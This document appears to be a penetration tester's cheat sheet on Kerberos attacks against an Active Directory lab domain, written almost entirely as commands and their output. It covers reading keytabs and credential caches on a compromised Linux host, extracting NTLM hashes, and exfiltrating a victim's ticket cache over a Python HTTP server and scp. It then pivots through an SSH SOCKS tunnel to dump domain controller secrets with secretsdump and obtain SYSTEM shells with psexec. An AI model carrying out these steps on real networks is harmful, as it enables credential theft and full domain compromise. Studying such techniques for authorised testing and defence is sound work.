# Kerberos Attacks

## Interesting files & Commands.
```bash
/etc/krb5.conf
/etc/krb5.keytab

# Find administrator credential cache 
env | grep KRB5CCNAME

# SMB Kerberos Authentication 
smbclient -k -U "SINHACK.COM\administrator" //DEV01.SINHACK.COM/C$
```

## Extracting keytab file

We can extract the krb5 keytab file using keytabextract to retrieve NTLM hash.

```bash
python3 keytabextract.py /etc/krb5.keytab
```

## Import and exploit kerberos ticket.

1. Copy the kerberos ticket and give it root right. Then download it.

```bash
target@sinhack03:/tmp$ sudo cp krb5cc_75401103_JMEyFf krb5cc_v0lk3n
target@sinhack03:/tmp$ sudo chown root:root krb5cc_v0lk3n 

target@sinhack03:/tmp$ sudo python -m SimpleHTTPServer 1337
Serving HTTP on 0.0.0.0 port 1337 ...
192.168.x.x - - [19/May/2021 14:27:51] "GET /krb5cc_v0lk3n HTTP/1.1" 200 -

```

2. Download the krb5.conf config file.

```bash
v0lk3n@sinhack03:/etc$ python -m SimpleHTTPServer 1337
Serving HTTP on 0.0.0.0 port 1337 ...
192.168.x.x - - [19/May/2021 14:22:03] "GET /krb5.conf HTTP/1.1" 200 -
```

3. Install kerberos tools on our kali

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ sudo apt install krb5-user                                        
```

4. Now that kerberos is installed, remove the /etc/krb5.conf of our kali (if exist) and replace it with the one downloaded from the target machine.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ sudo rm /etc/krb5.conf                                               
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ sudo mv krb5.conf /etc/krb5.conf

```

5. Import the downloaded kerberos ticket, then list tickets to confirm that we successfully imported it.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ export KRB5CCNAME=/home/v0lk3n/krb5cc_v0lk3n  

┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ klist                                                                                               1 ⨯
Ticket cache: FILE:/home/v0lk3n/krb5cc_v0lk3n
Default principal: zack@SINHACK.COM

Valid starting       Expires              Service principal
19. 05. 21 20:17:53  20. 05. 21 06:17:53  krbtgt/SINHACK.COM@SINHACK.COM
        renew until 26. 05. 21 20:17:53

```

6. Once the ticket imported run a SSH tunnel on the target machine with the -D parameter.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ ssh target@192.168.x.x -D 9050                                
target@192.168.x.x's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

```

7. Now that the tunnel has been created, and that the kerberos ticket is imported, we can run secretdump using proxychains, to dump the secret of DMZDC01.

```bash
──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py sinhack.com/zack@DC01.SINHACK.COM -k -no-pass
```

Alternatively we can get a shell using psexec.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py SINHACK.COM/zack@dc01.sinhack.com -k -no-pass -debug
```

## Using Kerberos with Impacket

Impacket is available in Kali at /usr/share/doc/python3-impacket/

The module psexec allows us to perform actions on a remote Windows host.

1. To allow kali to connect to the Kerberos environment properly, we need first to copy our victim's stolen ccache file to our Kali VM, and set the KRB5CCNAME environment variable.

```bash
scp target@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow

export KRB5CCNAME=/tmp/krb5cc_minenow
```

This will allow us to use the victim's Kerberos tickets as our own.

2. Install the Kerberos linux client utilities.

```bash
sudo apt install krb5-user
```

3. When prompted for a kerberos realm, we'll enter "sinhack.com". This lets the Kerberos tools know which domain we're connecting to.

4. We’ll need to add the domain controller IP to our Kali VM to resolve the domain properly. We can get the IP address of the domain controller from the linuxvictim VM by running "host sinhack.com" command.

5. Now add the domain controller (corp1.com) IP to the /etc/hosts file on kali

```
192.168.x.x SINHACK.COM DEV.SINHACK.COM
```

This allow Kerberos to properly resolve the domain names for the domain controller.

In order to use our Kerberos tickets, we will need to have the correct source IP, which in this case is the compromised linuxvictim host that is joined to the domain. 

Because of this, we’ll need to setup a SOCKS proxy on linuxvictim and use proxychains on Kali to pivot through the domain joined host when interacting with Kerberos.

6. We’ll need to comment out the line for proxy_dns in /etc/proxychains.conf to prevent issues with domain name resolution while using proxychains.

7. We need to set up a SOCKS server using ssh on the server we copied the ccache file from.

```bash
ssh target@linuxvictim -D 9050
```

The -D parameter specifies the port we'll be using for proxychians in order to tunnel kerberos requests. This port is specified in /etc/proxychains.conf

8. Examine the list of domain users with GetADUsers.py

```bash
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.x.x SINHACK.COM/Administrator
```

9. Get a list of the SPNs available to our Kerberos user.

```bash
proxychains python3 /usr/share/doc/python3-
impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.x.x SINHACK.COM/Administrator
```

10. Get a shell on the server.

```bash
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DEV.SINHACK.COM -k -no-pass
```

Using Impacket’s psexec module and our stolen Kerberos tickets, we are now SYSTEM on the domain controller and can do whatever we please.
